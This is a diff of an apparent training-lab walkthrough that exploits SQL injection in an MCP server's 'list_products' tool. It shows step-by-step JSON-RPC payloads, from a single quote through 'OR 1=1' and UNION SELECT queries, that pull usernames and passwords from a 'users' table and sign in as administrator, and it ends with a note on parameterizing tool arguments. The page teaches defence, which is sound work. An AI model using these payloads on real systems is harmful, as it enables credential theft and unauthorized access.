@@ -6,83 +6,65 @@ permalink: /labs/sql-injection-in-mcp-tool/
 
 # SQL Injection in an MCP Server Tool
 
-## Lab
+## Goal
 
-**Name:** SQL injection in an MCP server tool
-**Goal:** Find the administrator credentials and use them to solve the lab.
+Find the administrator credentials through the lab's `list_products` MCP tool, then use them to sign in.
 
-## Vulnerable Endpoint
+## Walkthrough
 
-The shop exposes an MCP server at `/mcp`. After initializing the server, list the available tools.
+1. Open the assigned lab in Burp Suite and send a request to `/mcp` so Burp captures the MCP initialization exchange. Keep using that same lab host and session for every request.
+2. Send `tools/list` and inspect the response. Find `list_products` and note that its `category` argument is passed as text.
 
-```json
-{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}
-```
+   ```json
+   {"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}
+   ```
 
-The lab exposes a `list_products` tool that accepts a `category` argument.
+3. Call the tool with an ordinary category first. Then add a single quote to the value. The malformed query produces an error instead of the normal product list, indicating that the value is affecting the SQL statement.
 
-## Exploitation
+   ```json
+   {
+     "jsonrpc":"2.0",
+     "id":3,
+     "method":"tools/call",
+     "params":{"name":"list_products","arguments":{"category":"Gifts'"}}
+   }
+   ```
 
-### 1. Confirm SQL injection
+4. Check whether a true condition changes the result. The following lab input returns products, confirming the injection point:
 
-A single quote produces an application error:
+   ```json
+   {
+     "jsonrpc":"2.0",
+     "id":4,
+     "method":"tools/call",
+     "params":{"name":"list_products","arguments":{"category":"Gifts' OR 1=1--"}}
+   }
+   ```
 
-```json
-{
-  "name": "list_products",
-  "arguments": {
-    "category": "Gifts'"
-  }
-}
-```
+5. Match the original query's column count with a `UNION SELECT`. Two `NULL` values are accepted, so the query has two columns:
 
-The tool call fails to list products.
+   ```json
+   {
+     "jsonrpc":"2.0",
+     "id":5,
+     "method":"tools/call",
+     "params":{"name":"list_products","arguments":{"category":"Gifts' UNION SELECT NULL,NULL--"}}
+   }
+   ```
 
-### 2. Confirm the Boolean behavior
+6. Replace the `NULL` values with the lab's `users` table fields. The returned rows include usernames and passwords:
 
-```json
-{
-  "name": "list_products",
-  "arguments": {
-    "category": "Gifts' OR 1=1--"
-  }
-}
-```
+   ```json
+   {
+     "jsonrpc":"2.0",
+     "id":6,
+     "method":"tools/call",
+     "params":{"name":"list_products","arguments":{"category":"Gifts' UNION SELECT username,password FROM users--"}}
+   }
+   ```
 
-This payload returns products, confirming that user input is inserted into a SQL query.
+7. Use the administrator row from the response to sign in at `/login`. The lab's solved banner confirms completion.
 
-### 3. Determine the number of columns
+## Why it works
 
-The following payload identifies a valid two-column `UNION` query:
-
-```json
-{
-  "name": "list_products",
-  "arguments": {
-    "category": "Gifts' UNION SELECT NULL,NULL--"
-  }
-}
-```
-
-### 4. Extract usernames and passwords
-
-The lab uses a PostgreSQL `users` table:
-
-```json
-{
-  "name": "list_products",
-  "arguments": {
-    "category": "Gifts' UNION SELECT username,password FROM users--"
-  }
-}
-```
-
-The returned data includes an administrator account and password.
-
-## Completion
-
-Log in through `/login` using the extracted administrator credentials. The lab status should change to solved.
-
-## Key Takeaway
-
-MCP tools can expose the same vulnerabilities as ordinary application endpoints. Tool arguments must be parameterized and validated before being passed to database queries.
+The server builds a database query from the tool argument rather than binding it as a parameter. MCP does not change the underlying SQL injection risk: tool arguments must be treated as untrusted input.
